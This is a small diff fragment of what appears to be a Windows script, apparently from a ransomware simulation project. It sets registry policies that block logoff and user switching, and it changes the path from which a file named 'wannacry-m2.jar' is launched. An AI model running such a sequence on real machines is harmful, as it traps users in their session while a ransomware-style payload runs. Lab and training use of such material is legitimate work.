@@ -13,7 +13,7 @@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v Disabl
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangeUser /t REG_DWORD /d 1 /f
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /t REG_DWORD /d 1 /f
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f
-C:\Users\user\Documents\m2_minientreprise_scripts\scripts\ressources\ransomware\wannacry-m2.jar
+C:\Users\monito\ressources\wannacry-m2.jar
 $date1 = Get-Date
 
 
